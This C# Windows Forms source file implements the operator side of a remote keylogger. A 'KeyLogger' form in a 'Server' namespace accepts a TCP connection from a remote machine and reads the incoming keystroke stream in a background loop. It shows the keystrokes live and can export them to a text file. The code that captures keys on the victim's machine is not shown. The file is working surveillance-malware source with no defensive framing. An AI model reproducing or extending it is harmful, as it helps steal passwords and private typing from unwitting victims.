using Keystroke.API;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server
{
    public partial class KeyLogger : Form
    {
        TcpClient Keyclient;
        Thread GetKeyLog;
        NetworkStream stream;

        public KeyLogger(TcpClient IPClient)
        {
            InitializeComponent();
            Keyclient = IPClient;
            IPBx.Text = Keyclient.Client.RemoteEndPoint.ToString();
            CheckForIllegalCrossThreadCalls = false;
            GetKeyLog = new Thread (KeyLogFunction);
            GetKeyLog.IsBackground = true;
            GetKeyLog.Start();
           
        }

        void KeyLogFunction()
        {
            stream = Keyclient.GetStream();
            stream.Flush();
            
            while (true)
            {
                try
                {
                    
                    byte[] data = new byte[1024];
                    
                    int x= stream.Read(data, 0, data.Length);
                    if (x > 0)
                    {
                        string s = Encoding.UTF8.GetString(data, 0, x);
                        LogBx.Text += s;
                    }
                }

                catch (Exception ex)
                {
                    
                    EndConnect();
                    MessageBox.Show(ex.Message);
                }
            }
            
        }

        void EndConnect()
        {
            stream.Close();
            Keyclient.Close();
            GetKeyLog.Abort();
            this.Close();
        }




        private void ExportBtn_Click(object sender, EventArgs e)
        {
            Thread t = new Thread(() => {

                SaveFileDialog saveFileDialog = new SaveFileDialog();
                saveFileDialog.Filter = "Text Files|*.txt";
                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    string fileName = saveFileDialog.FileName;
                    string content = LogBx.Text;

                    using (StreamWriter sw = new StreamWriter(fileName, false, Encoding.UTF8))
                    {
                        sw.Write(content);
                        sw.Flush();
                        sw.Close();
                    }

                }
            }
);
            t.SetApartmentState(ApartmentState.STA);
            t.Start();

        }
    }
}
